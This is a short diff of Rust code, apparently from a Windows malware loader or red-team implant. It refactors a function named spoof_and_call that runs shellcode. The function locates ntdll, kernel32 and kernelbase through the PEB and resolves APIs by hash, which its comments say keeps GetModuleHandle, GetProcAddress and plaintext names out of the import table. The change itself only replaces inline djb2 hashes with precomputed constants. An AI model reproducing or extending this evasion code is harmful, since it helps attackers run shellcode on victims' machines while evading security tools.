@@ -1,16 +1,12 @@
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
-    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
     use crate::resolve::api_hash::h;
 
     // Resolve module bases from PEB (no GetModuleHandle call-site string in import table)
-    const NTDLL_H:  u32 = djb2_hash_lower(b"ntdll.dll");
-    const K32_H:    u32 = djb2_hash_lower(b"kernel32.dll");
-    const KBASE_H:  u32 = djb2_hash_lower(b"kernelbase.dll");
-
-    let ntdll = peb_get_module_base(NTDLL_H);
-    let k32   = peb_get_module_base(K32_H);
-    let kbase = peb_get_module_base(KBASE_H);
+    let ntdll = peb_get_module_base(h::DLL_NTDLL);
+    let k32   = peb_get_module_base(h::DLL_K32);
+    let kbase = peb_get_module_base(h::DLL_KERNELBASE);
 
     // Resolve function addresses by hash (no GetProcAddress or plaintext names)
     let rts      = if !ntdll.is_null() { resolve_by_hash(ntdll, h::RTL_USR_THR) } else { None };
